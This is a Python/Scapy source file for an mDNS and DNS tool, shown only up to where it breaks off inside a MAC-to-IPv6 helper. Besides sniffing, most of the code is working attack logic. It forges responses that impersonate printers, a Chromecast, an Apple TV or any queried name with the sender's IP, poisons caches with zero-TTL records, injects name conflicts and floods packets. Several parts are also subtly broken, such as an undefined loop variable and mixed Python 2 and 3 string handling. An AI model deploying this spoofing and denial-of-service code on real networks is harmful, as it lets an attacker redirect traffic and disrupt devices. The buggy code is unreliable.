#!/usr/bin/python
from scapy.all import *
import argparse
import re
import binascii
import random
import multiprocessing
import logging
import itertools
import codecs
import ipaddress
from scapy.utils import PcapWriter

sys.setrecursionlimit(30000)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)#supress Scapy warnings`

######################################
### OBTAIN THE SYSTEM IPV6 ADDRESS ###
######################################
def get_my_ipv6_addr(interface):
    myip=""
    try:
        for ifaces in scapy.arch.linux.in6_getifaddr(): #in6_getifaddr() #return a list of IPs - ifaces, etc
            if ifaces[2]==interface:
                if not myip:
                    myip=ifaces[0]
                elif myip[0:6] == "fe80::":
                    myip=ifaces[0]
        return myip
    except:
        print("The interface",interface,"does not exist. Please, try again.")
        exit(0)

######################################
### OBTAIN THE SYSTEM IPV4 ADDRESS ###
######################################
def get_my_ipv4_addr(interface):
    myip=""
    try:
        myip=scapy.arch.get_if_addr(interface)
        return myip
    except:
        print("The interface",interface,"does not exist. Please, try again.")
        exit(0)

##########################
#####  SNIFFER CLASS #####
##########################
class Sniffer():
    def __init__ (self,filter,interface,sniffer_timeout,queue,dns,show_ttl,dos_ttl, conflict, ttl,d4, d6, target_mac, auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2,source_mac,hlimit,workstation,printer,googlecast,airtv,flood,flooding_timeout,flooding_interval, v4, v6):
        self.filter = filter
        self.interface = interface
        self.sniffer_timeout=sniffer_timeout
        self.queue=queue
        self.dns=dns
        self.show_ttl=show_ttl
        self.dos_ttl=dos_ttl
        self.conflict=conflict
        self.ttl=ttl
        self.d4=d4
        self.d6=d6
        self.target_mac=target_mac
        self.auto_fake_responses=auto_fake_responses
        self.source_IPv6=source_IPv6
        self.source_IPv4=source_IPv4
        self.target_mac1=target_mac1
        self.target_mac2=target_mac2
        self.source_mac=source_mac
        self.hlimit=hlimit
        self.workstation=workstation
        self.printer=printer
        self.airtv=airtv
        self.googlecast=googlecast
        self.flood=flood
        self.flooding_interval=flooding_interval
        self.flooding_timeout=flooding_timeout
        self.v4=v4
        self.v6=v6
        sniff(filter=self.filter, iface=self.interface, prn=self.handler, store=0, timeout=self.sniffer_timeout)
    def handler(self,packets):
        ext_handler(packets,self.queue,self.dns,self.show_ttl,1,self.dos_ttl,self.conflict, self.ttl,self.interface,self.d4,self.d6,self.target_mac,self.auto_fake_responses,self.source_IPv6,self.source_IPv4,self.target_mac1,self.target_mac2,self.source_mac,self.hlimit,self.workstation,self.printer,self.googlecast,self.airtv,self.flood,self.flooding_timeout,self.flooding_interval,self.v4,self.v6)

##################################
#####  OFFLINE SNIFFER CLASS #####
##################################
class Sniffer_Offline():
    def __init__ (self,interface,queue,show_ttl,d4, d6, target_mac,auto_fake_responses,source_IPv6, source_IPv4, target_mac1, target_mac2,source_mac,hlimit):
        self.interface = interface
        self.queue=queue
        self.show_ttl=show_ttl
        self.d4=d4
        self.d6=d6
        self.target_mac=target_mac
        self.auto_fake_responses=auto_fake_responses
        self.source_IPv6=source_IPv6
        self.source_IPv4=source_IPv4
        self.target_mac1=target_mac1
        self.target_mac2=target_mac2
        self.source_mac=source_mac
        self.hlimit=hlimit
        sniff(filter="udp and (port 5353 or port 53)", offline=self.interface, prn=self.handler, timeout=1)
    def handler(self,packets):
        ext_handler(packets,self.queue,False,self.show_ttl,1,False,False,4500,self.interface,self.d4,self.d6,self.target_mac,False,self.source_IPv6,self.source_IPv4,self.target_mac1,self.target_mac2,self.source_mac,self.hlimit,False,False,False,False,False,10.0,0.1,True,False)

########################################################################
### THE HANDLER THAT THE TWO SNIFFERS CALL - THIS MAKES THE MAIN JOB ###
########################################################################
def ext_handler(packets,queue,unidns,show_ttl,print_res,dos_ttl,conflict,ttl,interface,d4,d6,target_mac,auto_fake_responses,source_IPv6,source_IPv4,target_mac1,target_mac2,source_mac,hlimit,workstation,printer,googlecast,airtv,flood,flooding_timeout,flodding_interval,v4,v6):
    dns_type = {12: "PTR", 28: "AAAA", 13: "HINFO",33: "SRV", 1: "A", 255: "* (ANY)", 16: "TXT", 15: "MX", 6: "SOA", 256: "URI", 5: "CNAME",39: "DNAME"}
    Ether_src=packets.getlayer(Ether).src
    IP_src=None
    if packets.haslayer(IPv6):
        IP_src=packets.getlayer(IPv6).src
    elif packets.haslayer(IP):
        IP_src=packets.getlayer(IP).src
    res0= Ether_src + " " + IP_src
    if packets.haslayer(DNS):
        dns=packets.getlayer(DNS)
        if (conflict or dos_ttl) and dns.ancount>0:
            DNSBlocks = [ ]
            DNSBlocks.append(dns.an)
            if conflict:
                new_DNS_packet=DNS(id=dns[DNS].id,qr=dns[DNS].qr,opcode=dns[DNS].opcode,aa=dns[DNS].aa,tc=dns[DNS].tc,rd=dns[DNS].rd,ra=dns[DNS].ra,z=dns[DNS].z,ad=dns[DNS].ad,cd=dns[DNS].cd,rcode=dns[DNS].rcode,qdcount=0,ancount=dns[DNS].ancount,nscount=0,arcount=0,qd=dns[DNS].qd)
                if target_mac:
                    new_packet=Ether(src=source_mac,dst=target_mac)
                else:
                    new_packet=Ether(src=source_mac,dst=packets[Ether].dst)
                if packets.haslayer(IPv6):
                    if d6:
                        new_packet=new_packet/IPv6(src=source_IPv6,dst=d6,hlim=packets[IPv6].hlim)
                    else:
                        new_packet=new_packet/IPv6(src=source_IPv6,dst=packets[IPv6].dst,hlim=packets[IPv6].hlim)
                else:
                    if d4:
                        new_packet=new_packet/IP(src=source_IPv4,dst=d4,ttl=packets[IP].ttl)
                    else:
                        new_packet=new_packet/IP(src=source_IPv4,dst=packets[IP].dst,ttl=packets[IP].ttl)
                for p in DNSBlocks:
                    if isinstance(p,DNSRR):
                        new_DNS_packet=new_DNS_packet/p
            elif dos_ttl:
                new_DNS_packet=DNS(id=dns[DNS].id,qr=dns[DNS].qr,opcode=dns[DNS].opcode,aa=dns[DNS].aa,tc=dns[DNS].tc,rd=dns[DNS].rd,ra=dns[DNS].ra,z=dns[DNS].z,ad=dns[DNS].ad,cd=dns[DNS].cd,rcode=dns[DNS].rcode,qdcount=0,ancount=dns[DNS].ancount,nscount=0,arcount=dns[DNS].arcount,qd=dns[DNS].qd)
                DNSBlocks.append(dns.ar)
                if target_mac:
                    new_packet=Ether(src=source_mac,dst=target_mac)
                else:
                    new_packet=Ether(src=packets[Ether].src,dst=packets[Ether].dst)
                if packets.haslayer(IPv6):
                    if d6:
                        new_packet=new_packet/IPv6(src=packets[IPv6].src,dst=d6,hlim=packets[IPv6].hlim)
                    else:
                        new_packet=new_packet/IPv6(src=packets[IPv6].src,dst=packets[IPv6].dst,hlim=packets[IPv6].hlim)
                else:
                    if d4:
                        new_packet=new_packet/IP(src=packets[IP].src,dst=d4,ttl=packets[IP].ttl)
                    else:
                        new_packet=new_packet/IP(src=packets[IP].src,dst=packets[IP].dst,ttl=packets[IP].ttl)
                for p in DNSBlocks:
                    if isinstance(p,DNSRR):
                        new_p=DNSRR()
                        new_p.ttl=0
                        new_p.rrname=p.rrname
                        new_p.type=p.type
                        new_p.rclass=p.rclass
                        new_p.rdlen=p.rdlen
                        new_p.rdata=p.rdata
                        new_DNS_packet=new_DNS_packet/new_p
            if unidns:
                new_packet=new_packet/UDP(dport=53)/new_DNS_packet
            else:
                new_packet=new_packet/UDP(dport=5353,sport=5353)/new_DNS_packet
            for x in range(0,2):#Send each packet twice
                sendp(new_packet,iface=interface)
        elif auto_fake_responses or (not (dos_ttl or conflict)):
            ## IF THIS IS A QUERY ##
            if dns.opcode==0:
                res0 = res0 + " QUERY"
                if dns.qdcount>0:
                    DNSBlocks = [ ]
                    DNSBlocks.append(dns.qd)
                    for block in DNSBlocks:
                        while isinstance(block,DNSQR):
                            dnsqr=block.getlayer(DNSQR)
                            ### IF WE NEED TO AUTO RESPOND WITH A FAKE | DOS RESPONSE ###
                            if auto_fake_responses:
                                myttl=int(ttl)
                                if isinstance(dnsqr.qname,bytes):
                                    qname=dnsqr.qname.decode("utf-8")
                                else:
                                    qname=dnsqr.qname
                                if isinstance(dnsqr.name,bytes):
                                    name=dnsqr.name.decode("utf-8")
                                else:
                                    name=dnsqr.name
                                if (("in-addr.arpa" in qname) or ("ip6.arpa" in name)) and workstation:
                                    if unidns:
                                        dns_packet=UDP(dport=53)/DNS(qr=1,aa=1,rd=0,ancount=1,arcount=0)/DNSRR(rrname=dnsqr.qname,ttl=myttl,rdata='mitsos.local',type="PTR")
                                    else:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=1,arcount=0)/DNSRR(rrname=dnsqr.qname,ttl=myttl,rdata='mitsos.local',type="PTR")
                                elif ("_workstation._tcp." in qname) and workstation:
                                    #qname=dnsqr.qname
                                    if qname.endswith('.'):
                                        qname=qname[:-1]
                                    if unidns:
                                        dns_packet=UDP(dport=53)/DNS(qr=1,aa=1,rd=0,ancount=3)/DNSRR(rrname="_workstation._tcp.local",ttl=myttl,rdata="mitsos._workstation._tcp.local",type="PTR",rclass=32769)/DNSRR(rrname=qname,ttl=myttl,type="TXT",rclass=32769)/DNSRR(rrname="mitsos.local",ttl=myttl,rdata=source_IPv4,type="A",rclass=32769)
                                    else:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=3)/DNSRR(rrname="_workstation._tcp.local",ttl=myttl,rdata="mitsos._workstation._tcp.local",type="PTR",rclass=32769)/DNSRR(rrname=qname,ttl=myttl,type="TXT",rclass=32769)/DNSRR(rrname="mitsos.local",ttl=myttl,rdata=source_IPv4,type="A",rclass=32769)
                                elif (("_pdl-datastream._tcp." in qname) or ("_ipp._tcp." in qname)) and printer:
                                    #qname=dnsqr.qname
                                    if qname.endswith('.'):
                                        qname=qname[:-1]
                                    #make the SRV additional record
                                    port=9100
                                    port='{0:016b}'.format(port)
                                    port="{0:0>4X}".format(int(port, 2))
                                    weight=0
                                    weight='{0:016b}'.format(weight)
                                    weight="{0:0>4X}".format(int(weight, 2))
                                    priority=0
                                    priority='{0:016b}'.format(priority)
                                    priority="{0:0>4X}".format(int(priority, 2))
                                    data=priority.decode("hex")+weight.decode("hex")+port.decode("hex")
                                    #for explanation, check http://stackoverflow.com/questions/26933016/rdata-field-of-a-dns-sd-ptr-packet-sent-via-scapy-results-in-an-unknown-extended
                                    sublabels = "HP10000.local".split(".") + [""]
                                    label_format = ""
                                    for s in sublabels:
                                        label_format = '%s%dp' % (label_format, len(s) + 1)
                                    label_data = struct.pack(label_format, *sublabels)
                                    srv_rrname=data+label_data
                                    txt_record=""
                                    rdata=['txtvers=1','qtotal=1','pdl=application/vnd.hp-PCL','ty=MyOfficejet100000','product=(Trexa gureue)','priority=0','adminur=http://'+source_IPv4]
                                    #print(type(rdata))
                                    for r in rdata:
                                        length=hex(len(r))[2:]
                                        #check http://code.activestate.com/recipes/576617-converting-arbitrary-size-python-integers-to-packe/
                                        if len(r) > 255:
                                            s=struct.Struct('I')# CHECK IT
                                        else:
                                            s=struct.Struct('B')
                                        value=(len(r),)
                                        packed_data=s.pack(*value)
                                        txt_record=txt_record+packed_data+r
                                    pkt= DNSRR(rrname="MyOfficejet10000._pdl-datasream._tcp.local",type="TXT",ttl=myttl,rclass=32769,rdata=txt_record)
                                    pkt.rdlen-=1
                                    mylength=len(pkt.rrname)+12
                                    dnsrr_packet=str(pkt)[0:mylength]+str(pkt)[mylength+1::]
                                    pkt=dnsrr_packet
                                    if unidns:
                                        dns_packet=UDP(dport=53)/DNS(qr=1,aa=1,rd=0,ancount=1,arcount=3)/DNSRR(rrname=qname,ttl=myttl,rdata="MyOffice10000."+qname,type="PTR",rclass=32769)/DNSRR(rrname="HP10000.local",ttl=myttl,type="A",rclass=32769,rdata=source_IPv4)/DNSRR(rrname="MyOffice100000."+qname,ttl=myttl,type="SRV",rclass=32769,rdata=srv_rrname)/pkt
                                    else:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=1,arcount=3)/DNSRR(rrname=qname,ttl=myttl,rdata="MyOffice10000."+qname,type="PTR",rclass=32769)/DNSRR(rrname="HP10000.local",ttl=myttl,type="A",rclass=32769,rdata=source_IPv4)/DNSRR(rrname="MyOffice100000."+qname,ttl=myttl,type="SRV",rclass=32769,rdata=srv_rrname)/pkt
                                elif ("_googlecast._tcp." in qname) and googlecast:
                                    #qname=dnsqr.qname
                                    if qname.endswith('.'):
                                        qname=qname[:-1]
                                    #make the SRV additional record
                                    port=8009
                                    port='{0:016b}'.format(port)
                                    port="{0:0>4X}".format(int(port, 2))
                                    weight=0
                                    weight='{0:016b}'.format(weight)
                                    weight="{0:0>4X}".format(int(weight, 2))
                                    priority=0
                                    priority='{0:016b}'.format(priority)
                                    priority="{0:0>4X}".format(int(priority, 2))
                                    data=priority.decode("hex")+weight.decode("hex")+port.decode("hex")
                                    sublabels = "32799abf-18ea-631d-62ae-390515bb47c5.local".split(".") + [""]
                                    label_format = ""
                                    for s in sublabels:
                                        label_format = '%s%dp' % (label_format, len(s) + 1)
                                    label_data = struct.pack(label_format, *sublabels)
                                    srv_rrname=data+label_data
                                    txt_record=""
                                    rdata=['id=32799abf-18ea-631d-62ae-390515bb47c5','rm=','ve=05','md=Chromecast Ultra','ic=/setup/icon.png','fn=LivingRoom','ca=4101','st=0','bs=FA8FCA7EO948','rs=0']
                                    for r in rdata:
                                        length=hex(len(r))[2:]
                                        if len(r) > 255:
                                            s=struct.Struct('I')# CHECK IT
                                        else:
                                            s=struct.Struct('B')
                                        value=(len(r),)
                                        packed_data=s.pack(*value)
                                        txt_record=txt_record+packed_data+r
                                    pkt= DNSRR(rrname="Chromecast-Ultra-32799abf-18ea-631d-62ae-390515bb47c5."+qname,type="TXT",ttl=myttl,rclass=32769,rdata=txt_record)
                                    pkt.rdlen-=1
                                    mylength=len(pkt.rrname)+12
                                    dnsrr_packet=str(pkt)[0:mylength]+str(pkt)[mylength+1::]
                                    pkt=dnsrr_packet
                                    if unidns:
                                        dns_packet=UDP(dport=53)/DNS(qr=1,aa=1,rd=0,ancount=1,arcount=3)/DNSRR(rrname=qname,ttl=myttl,rdata="Chromecast-Ultra-32799abf-18ea-631d-62ae-390515bb47c5."+qname,type="PTR")/pkt/DNSRR(rrname="ChromecastUltra."+qname,ttl=myttl,type="SRV",rclass=32769,rdata=srv_rrname)/DNSRR(rrname="32799abf-18ea-631d-62ae-390515bb47c5.local",ttl=myttl,type="A",rclass=32769,rdata=source_IPv4)
                                    else:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=1,arcount=3)/DNSRR(rrname=qname,ttl=myttl,rdata="Chromecast-Ultra-32799abf-18ea-631d-62ae-390515bb47c5."+qname,type="PTR")/pkt/DNSRR(rrname="ChromecastUltra."+qname,ttl=myttl,type="SRV",rclass=32769,rdata=srv_rrname)/DNSRR(rrname="32799abf-18ea-631d-62ae-390515bb47c5.local",ttl=myttl,type="A",rclass=32769,rdata=source_IPv4)
                                elif ("_airplay." in qname) and airtv:
                                    #qname=dnsqr.qname
                                    if qname.endswith('.'):
                                        qname=qname[:-1]

                                    txt_record=""
                                    rdata=['model=J33AP']
                                    for r in rdata:
                                        length=hex(len(r))[2:]
                                        if len(r) > 255:
                                            s=struct.Struct('I')# CHECK IT
                                        else:
                                            s=struct.Struct('B')
                                        value=(len(r),)
                                        packed_data=s.pack(*value)
                                        txt_record=txt_record+packed_data+r
                                    pkt= DNSRR(rrname="Apple TV-mitsos._device-info._tcp.local",type="TXT",ttl=myttl,rclass=32769,rdata=txt_record)
                                    pkt.rdlen-=1
                                    mylength=len(pkt.rrname)+12
                                    dnsrr_packet=str(pkt)[0:mylength]+str(pkt)[mylength+1::]
                                    pkt=dnsrr_packet

                                    txt_record=""
                                    rdata=['deviceid=9C:20:7B:AD:6B:E4','features=0x5A7FFFF7,0xE','flags=0x44','model=AppleTV3,1','pk=ab69a89af6fe7ff1fd803f74c6681d786aff1e6bc52087e49cc8f22585916ccd','pi=a62a851e-d024-439f-9ee0-01ef1b23d6ca','srcvers=220.68','vv=2']
                                    for r in rdata:
                                        length=hex(len(r))[2:]
                                        if len(r) > 255:
                                            s=struct.Struct('I')# CHECK IT
                                        else:
                                            s=struct.Struct('B')
                                        value=(len(r),)
                                        packed_data=s.pack(*value)
                                        txt_record=txt_record+packed_data+r
                                    pkt2= DNSRR(rrname="Apple TV-mitsos._airplay._tcp.local",type="TXT",ttl=myttl,rclass=32769,rdata=txt_record)
                                    pkt2.rdlen-=1
                                    mylength=len(pkt2.rrname)+12
                                    dnsrr_packet=str(pkt2)[0:mylength]+str(pkt2)[mylength+1::]
                                    pkt2=dnsrr_packet

                                    txt_record=""
                                    rdata=['cn=0,1,2,3','da=true','et=0,3,5','ft=0x5A7FFFF7,0xE','md=0,1,2','am=AppleTV3,1','pk=ab69a89af6fe7ff1fd803f74c6681d786aff1e6bc52087e49cc8f22585916ccd','sf=0x44','tp=UDP','vn=65537','vs=220.68','vv=2']
                                    for r in rdata:
                                        length=hex(len(r))[2:]
                                        if len(r) > 255:
                                            s=struct.Struct('I')# CHECK IT
                                        else:
                                            s=struct.Struct('B')
                                        value=(len(r),)
                                        packed_data=s.pack(*value)
                                        txt_record=txt_record+packed_data+r
                                    pkt3= DNSRR(rrname="9C207BAD6BE4@Apple TV-mitsos._raop._tcp.local",type="TXT",ttl=myttl,rclass=32769,rdata=txt_record)
                                    pkt3.rdlen-=1
                                    mylength=len(pkt3.rrname)+12
                                    dnsrr_packet=str(pkt3)[0:mylength]+str(pkt3)[mylength+1::]
                                    pkt3=dnsrr_packet

                                    #make the SRV additional record
                                    port=7000
                                    port='{0:016b}'.format(port)
                                    port="{0:0>4X}".format(int(port, 2))
                                    weight=0
                                    weight='{0:016b}'.format(weight)
                                    weight="{0:0>4X}".format(int(weight, 2))
                                    priority=0
                                    priority='{0:016b}'.format(priority)
                                    priority="{0:0>4X}".format(int(priority, 2))
                                    data=priority.decode("hex")+weight.decode("hex")+port.decode("hex")
                                    sublabels = "Apple-TV.local".split(".") + [""]
                                    label_format = ""
                                    for s in sublabels:
                                        label_format = '%s%dp' % (label_format, len(s) + 1)
                                    label_data = struct.pack(label_format, *sublabels)
                                    srv_rrname=data+label_data

                                    if unidns:
                                        dns_packet=UDP(dport=53)
                                    else:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=3,arcount=6)/DNSRR(rrname=qname,ttl=myttl,rdata="Apple TV-mitsos._device-info."+qname,type="PTR")/pkt/DNSRR(rrname="_raop._tcp.local",ttl=myttl,rdata="9C207BAD6BE4@Apple TV-mitsos._raop._tcp.local",type="PTR")/pkt2/pkt3/DNSRR(rrname="Apple TV-mitsos."+qname,ttl=myttl,type="SRV",rclass=32769,rdata=srv_rrname)/DNSRR(rrname="9C207BAD6BE4@Apple TV-mitsos._raop._tcp.local",ttl=myttl,type="SRV",rclass=32769,rdata=srv_rrname)/DNSRR(rrname="Apple-TV.local",ttl=myttl,rdata=source_IPv4,type="A",rclass=32769)/DNSRR(rrname="Apple-TV.local",ttl=myttl,rdata=source_IPv6,type="AAAA",rclass=32769)
                                else:
                                    if isinstance(dnsqr.qname,bytes):
                                        qname=dnsqr.qname.decode("utf-8")
                                    else:
                                        qname=dnsqr.qname
                                    if qname.endswith('.'):
                                        qname=qname[:-1]
                                    #print("Query Name = ",qname," Type=",dnsqr.qtype)
                                    if unidns:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=1)/DNSRR(rrname=qname,ttl=myttl,rdata=source_IPv4,type="A")
                                    else:
                                        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=1,aa=1,rd=0,ancount=1)/DNSRR(rrname=qname,ttl=myttl,rdata=source_IPv4,type="A")
                                send_packets(v4,v6,source_mac,target_mac1,target_mac2,source_IPv4,d4,source_IPv6,d6,interface,hlimit,dns_packet,False,10.0,0.1)#CHANGE DEFAULT VALUES
                            ### END "IF WE NEED TO AUTO RESPOND WITH A FAKE RESPONSE
                            ### NEXT LINES ARE ONLY USED TO PRINT RESULTS ###
                            if dnsqr.qclass==32769:
                                res = res0 + " Question: "+dnsqr.qname.decode("utf-8") + " " + dns_type[dnsqr.qtype] +" QU Class:IN"
                            elif dnsqr.qclass==1:
                                res = res0 + " Question: "+dnsqr.qname.decode("utf-8") + " "+ dns_type[dnsqr.qtype] + " QM Class:IN"
                            elif dnsqr.qclass==255:
                                res = res0 + " Question: "+dnsqr.qname.decode("utf-8") + " "+ dns_type[dnsqr.qtype] + " QM Class:ANY"
                            else:
                                print("DNSQR:")
                                print("-----")
                                print(dnsqr.show())
                                print("DEBUGGING IS NEEDED")
                                exit(0)
                            if print_res==1:
                                print(res)
                            queue.put(res)
                            block = block.payload
                if dns.arcount>0:
                    DNSBlocks = [ ]
                    DNSBlocks.append(dns.ar)
                    for block in DNSBlocks:
                        if block.haslayer(DNSRROPT):
                            while isinstance(block,DNSRROPT):#Somewhat equivalent: while not isinstance(an, NoPayload):
                                dnsrropt=block.getlayer(DNSRROPT)
                                #print "DNS OPT Resource Record"
                                if dnsrropt.rrname == ".":
                                    rrname = "<Root>"
                                else:
                                    rrname = dnsrropt.rrname
                                if dnsrropt.type==41:
                                    ARtype="OPT"
                                else:
                                    ARtype=str(dnsrropt.type)
                                res = res0 + " Additional_Record: " + rrname.decode("utf-8")  + " " + ARtype 
                                if dnsrropt.haslayer(EDNS0TLV):
                                    edns0tlv=dnsrropt.getlayer(EDNS0TLV)
                                    if edns0tlv.optcode==4:
                                        optcode="Reserved"
                                    else:
                                        optcode=str(edns0tlv.optcode)
                                    res = res + " EDNS0TLV: " + optcode + " " + codecs.encode(edns0tlv.optdata, 'hex_codec').decode("utf-8")
                                if print_res==1:
                                    print(res)
                                queue.put(res)
                                block = block.payload
                        elif block.haslayer(DNSRR):
                            while isinstance(block,DNSRR):#Somewhat equivalent: while not isinstance(an, NoPayload):
                                dnsrr=block.getlayer(DNSRR)
                                if dnsrr.rclass==32769:
                                    res = res0 + " DNS Resource Record: "+ dnsrr.rrname + " " + dns_type[dnsrr.type] +" QU Class:IN "+dnsrr.rdata
                                elif dnsrr.rclass==1:
                                    res = res0 + " DNS Resource Record: "+dnsrr.rrname + " "+ dns_type[dnsrr.type] + " QM Class:IN "+dnsrr.rdata
                                elif dnsrr.qclass==255:
                                    res = res0 + " Question: "+dnsrr.qname + " "+ dns_type[dnsrr.qtype] + " QM Class:ANY"
                                else:
                                    print("DNSRR:")
                                    print("-----")
                                    print(dnsrr.show())
                                    print("DEBUGGING IS NEEDED HERE")
                                    exit(0)
                                if dnsrr.type==33:#SRV Record
                                    priority=str(dnsrr.rdata)[0].encode("HEX")+str(dnsrr.rdata)[1].encode("HEX")
                                    weight=str(dnsrr.rdata)[2].encode("HEX")+str(dnsrr.rdata)[3].encode("HEX")
                                    port_number=str(dnsrr.rdata)[4].encode("HEX")+str(dnsrr.rdata)[5].encode("HEX")
                                    res = res0 + " Additional_Record: "+dnsrr.rrname + " " + dns_type[dnsrr.type]+" " + str(dnsrr.rclass) + " priority="+str(int(priority,16))+" weight="+str(int(weight,16))+" port="+str(int(port_number,16))+" target="+str(dnsrr.rdata)[6::]
                                else:
                                    rdata=dnsrr.rdata
                                    if isinstance(rdata,bytes):
                                        rdata = rdata.decode("utf-8")
                                    if "._tcp." not in rdata and "._udp." not in rdata:
                                        if rdata == "_dhnap.":
                                            rdata=rdata+"_tcp."
                                    res = res0 + " Additional_Record: "+dnsrr.rrname + " " + dns_type[dnsrr.type]+" " + str(dnsrr.rclass) + ' "' +rdata+'"'
                                if show_ttl:
                                    res = res + " TTL:"+str(dnsrr.ttl)
                                if print_res==1:
                                    print(res)
                                queue.put(res)
                                block = block.payload
                if dns.ancount>0:
                    DNSBlocks = [ ]
                    DNSBlocks.append(dns.an)
                    for block in DNSBlocks:
                        while isinstance(block,DNSRR):
                            dnsrr=block.getlayer(DNSRR)
                            if dnsrr.rclass==1:
                                rclass="Class:IN"
                            else:
                                rclass="Class:"+str(dnsrr.rclass)
                            rdata=dnsrr.rdata
                            if isinstance(rdata,bytes):
                                rdata = rdata.decode("utf-8")
                            if dnsrr.type==33:#SRV Record
                                priority=str(dnsrr.rdata)[0].encode("HEX")+str(dnsrr.rdata)[1].encode("HEX")
                                weight=str(dnsrr.rdata)[2].encode("HEX")+str(dnsrr.rdata)[3].encode("HEX")
                                port_number=str(dnsrr.rdata)[4].encode("HEX")+str(dnsrr.rdata)[5].encode("HEX")
                                res = res0 + " Answer: "+dnsrr.rrname + " " + dns_type[dnsrr.type]+" " + rclass + " priority="+str(int(priority,16))+" weight="+str(int(weight,16))+" port="+str(int(port_number,16))+" target="+str(dnsrr.rdata)[6::]
                            else:
                                if "._tcp." not in rdata and "._udp." not in rdata:
                                    if rdata  == "_dhnap.":
                                        rdata=dnsrr.rdata+"_tcp."
                                if isinstance(rdata,list):
                                    rdata = b" ".join(rdata).decode("utf-8")
                                res = res0 + " Answer: "+dnsrr.rrname.decode("utf-8") + " " + dns_type[dnsrr.type]+" " + rclass + ' "' +rdata+'"'
                            if show_ttl:
                                res = res + " TTL:"+str(dnsrr.ttl)
                            if print_res==1:
                                print(res)
                            queue.put(res)
                            block = block.payload
                if dns.nscount>0:
                    DNSBlocks = [ ]
                    DNSBlocks.append(dns.ns)
                    for block in DNSBlocks:
                        while isinstance(block,DNSRR):
                            dnsrr=block.getlayer(DNSRR)
                            if dnsrr.rclass==1:
                                rclass="Class:IN"
                            else:
                                rclass="Class:"+str(dnsrr.rclass)
                            res = res0 + " Auth_NS: "+dnsrr.rrname + " " + dns_type[dnsrr.type]+" " + rclass + ' "' +dnsrr.rdata+'"'
                            if show_ttl:
                                res = res + " TTL:"+str(dnsrr.ttl)
                            if print_res==1:
                                print(res)
                            queue.put(res)
                            block = block.payload
            else:
                print("not a DNS Query", dns.summary())

########################################
########### REQUEST FUNCTION ###########
########################################
def requests(interface,v4,v6,source_mac,target_mac1,target_mac2,source_IPv4,source_IPv6,d4,d6,hlimit,unidns,domain,query,types_of_queries,add_domain,query_class,flood,flooding_interval,flooding_timeout):
    if add_domain:
        print("Sending mdns requests")
    domain_list = domain.split(",")
    query_list = query.split(",")
    if add_domain:
        the_query=query_list[0]+"."+domain_list[0]
    else:
        types_of_queries="ALL"#implies that first a generic scan has beem performed
        the_query=query_list[0]
    dns_query=DNSQR(qname=the_query,qtype=types_of_queries,qclass=int(query_class))
    for j in range(1,len(query_list)):
        if add_domain:
            the_query=query_list[j]+"."+domain_list[0]
        else:
            the_query=query_list[j]
        dns_query=dns_query/DNSQR(qname=the_query,qtype=types_of_queries,qclass=int(query_class))
    if add_domain:
        for i in range(1,len(domain_list)):
            for j in query_list:
                the_query=j+"."+domain_list[i]
                dns_query=dns_query/DNSQR(qname=the_query,qtype=types_of_queries,qclass=int(query_class))
    if unidns:
        dns_packet=UDP(dport=53)/DNS(qr=0,qd=dns_query)
    else:
        dns_packet=UDP(sport=5353,dport=5353)/DNS(qr=0,qd=dns_query)
    send_packets(v4,v6,source_mac,target_mac1,target_mac2,source_IPv4,d4,source_IPv6,d6,interface,hlimit,dns_packet,flood,flooding_timeout,flooding_interval)

########################################
######## SEND PACKETS FUNCTION #########
########################################
def send_packets(v4,v6,source_mac,target_mac1,target_mac2,source_IPv4,dst_ipv4,source_IPv6,dst_ipv6,interface,hlimit,payload,flood,flooding_timeout,flooding_interval):
    if v4 or not v6:
        packet=IP(src=source_IPv4,dst=dst_ipv4,ttl=hlimit,proto="udp")/payload
        if len(packet)>1500:
            frags=fragment(packet)
            packets=[]
            for frag in frags:
                pkt1=Ether(src=source_mac,dst=target_mac1)/frag
                packets.append(pkt1)
            if flood:
                counter=0.0
                print("Stop flooding after ",flooding_timeout," sec.")
                while(counter<float(flooding_timeout)):
                    for packt in packets:
                        sendp(pakt,iface=interface)
                    counter+=float(flooding_interval)
                    time.sleep(float(flooding_interval))
            else:
                for pakt in packets:
                    sendp(pakt,iface=interface)
        else:
            pkt1=Ether(src=source_mac,dst=target_mac1)/packet
            if flood:
                counter=0.0
                print("Stop flooding after ",flooding_timeout," sec.")
                while(counter<float(flooding_timeout)):
                    sendp(pkt1,iface=interface)
                    counter+=float(flooding_interval)
                    time.sleep(float(flooding_interval))
            else:
                sendp(pkt1,iface=interface)
    if v6:
        packet=IPv6(src=source_IPv6,dst=dst_ipv6,hlim=hlimit)/payload
        if len(packet)>1500:
            frags2=fragment6(IPv6(src=source_IPv6,dst=dst_ipv6,hlim=hlimit)/IPv6ExtHdrFragment()/payload,1480)
            packets=[]
            for frag2 in frags2:
                pkt2=Ether(src=source_mac,dst=target_mac2)/frag2
                packets.append(pkt2)
            if flood:
                counter=0.0
                print("Stop flooding after ",flooding_timeout," sec.")
                while(counter<float(flooding_timeout)):
                    for packt in packets:
                        sendp(pakt,iface=interface)
                    counter+=float(flooding_interval)
                    time.sleep(float(flooding_interval))
            else:
                for packt in packets:
                    sendp(pkt2,iface=interface)
        else:
            pkt2=Ether(src=source_mac,dst=target_mac2)/packet
            if flood:
                counter=0.0
                print("Stop flooding after ",flooding_timeout," sec.")
                while(counter<float(flooding_timeout)):
                    sendp(pkt2,iface=interface)
                    counter+=float(flooding_interval)
                    time.sleep(float(flooding_interval))
            else:
                pkt2=Ether(src=source_mac,dst=target_mac2)/packet
                sendp(pkt2,iface=interface)

##########################################################
### Create an IPv6 link local address from MAC address ###
##########################################################
def mac2ipv6(mac):
    ###Code from https://stackoverflow.com/questions/37140846/how-to-convert-ipv6-link-local-address-to-mac-address-in-python###
    # only accept MACs separated by a colon
    parts = mac.split(":")

    # modify parts to match IPv6 value
    parts.insert(3, "ff")
    parts.insert(4, "fe")
